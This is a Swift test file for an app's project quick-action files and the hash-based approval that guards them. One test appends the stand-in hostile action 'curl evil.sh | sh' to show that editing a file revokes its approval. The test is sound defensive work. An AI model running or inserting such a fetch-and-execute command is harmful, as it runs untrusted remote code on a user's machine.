import Testing
@testable import NyxCore

private let projectFile = """
# Buttons for this project.
quick = Test | make test
quick = Up | toggle | docker compose up
font-size = 96
theme = something-else
"""

// MARK: - Parsing a project file

@Test func aProjectFileContributesItsQuickActions() {
    let project = ProjectActionsFile.parse(projectFile)
    #expect(project.actions.count == 2)
    #expect(project.actions[0].name == "Test")
    #expect(project.actions[1].kind == .toggle)
}

/// A project may add buttons. It may not reach into settings -- a repository that could set your
/// font, your theme or your key bindings by being cloned is a repository that can surprise you.
@Test func aProjectFileCannotChangeSettings() {
    let project = ProjectActionsFile.parse(projectFile)
    #expect(project.actions.allSatisfy { $0.name != "font-size" && $0.name != "theme" })
    // Nothing but `quick` is read at all, so there is no path from this file to a Config value.
    #expect(project.actions.count == 2)
}

@Test func anEmptyOrCommentOnlyFileContributesNothing() {
    #expect(ProjectActionsFile.parse("").actions.isEmpty)
    #expect(ProjectActionsFile.parse("# nothing here\n\n").actions.isEmpty)
}

// MARK: - Approval

@Test func nothingIsApprovedUntilItIsApproved() {
    let project = ProjectActionsFile.parse(projectFile)
    let approvals = ProjectApprovals()
    #expect(!approvals.isApproved(directory: "/repo", digest: project.digest))
    #expect(!approvals.wasApprovedForDifferentContent(directory: "/repo", digest: project.digest))
}

@Test func approvingADirectoryLetsItsActionsThrough() {
    let project = ProjectActionsFile.parse(projectFile)
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo", digest: project.digest)
    #expect(approvals.isApproved(directory: "/repo", digest: project.digest))
}

/// The whole point of hashing the contents: a `git pull` that changes the file must not inherit
/// the approval given to what the user actually read.
@Test func editingTheFileRevokesTheApproval() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo", digest: ProjectActionsFile.parse(projectFile).digest)

    let changed = ProjectActionsFile.parse(projectFile + "\nquick = Sneaky | curl evil.sh | sh")
    #expect(!approvals.isApproved(directory: "/repo", digest: changed.digest))
    // ...and the caller can tell "this changed" apart from "never seen before", which are
    // different things to say to someone.
    #expect(approvals.wasApprovedForDifferentContent(directory: "/repo", digest: changed.digest))
}

@Test func approvingOneDirectoryDoesNotApproveAnother() {
    let project = ProjectActionsFile.parse(projectFile)
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo", digest: project.digest)
    #expect(!approvals.isApproved(directory: "/other", digest: project.digest))
}

@Test func revokingTakesItBack() {
    let project = ProjectActionsFile.parse(projectFile)
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo", digest: project.digest)
    approvals.revoke(directory: "/repo")
    #expect(!approvals.isApproved(directory: "/repo", digest: project.digest))
}

/// `cd` reports a path with or without its trailing slash depending on how it was typed, and being
/// asked to approve the same project twice would look broken.
@Test func aTrailingSlashIsTheSameDirectory() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/repo/", digest: "abc")
    #expect(approvals.isApproved(directory: "/repo", digest: "abc"))
    #expect(approvals.isApproved(directory: "/repo/", digest: "abc"))
}

@Test func theRootDirectoryKeepsItsSlash() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/", digest: "abc")
    #expect(approvals.isApproved(directory: "/", digest: "abc"))
}

// MARK: - Round trip

@Test func approvalsSurviveBeingWrittenAndReadBack() {
    var approvals = ProjectApprovals()
    approvals.approve(directory: "/Users/nik/projects/nyx", digest: "deadbeef")
    approvals.approve(directory: "/Users/nik/My Projects/with spaces", digest: "cafe")

    let restored = ProjectApprovals.parse(approvals.serialised())
    #expect(restored == approvals)
    #expect(restored.isApproved(directory: "/Users/nik/My Projects/with spaces", digest: "cafe"))
}

@Test func aHandEditedApprovalsFileIsReadLeniently() {
    let restored = ProjectApprovals.parse("""
    # a comment

    deadbeef /Users/nik/projects/nyx
    garbage-with-no-directory
    """)
    #expect(restored.isApproved(directory: "/Users/nik/projects/nyx", digest: "deadbeef"))
    #expect(restored.directories.count == 1)
}
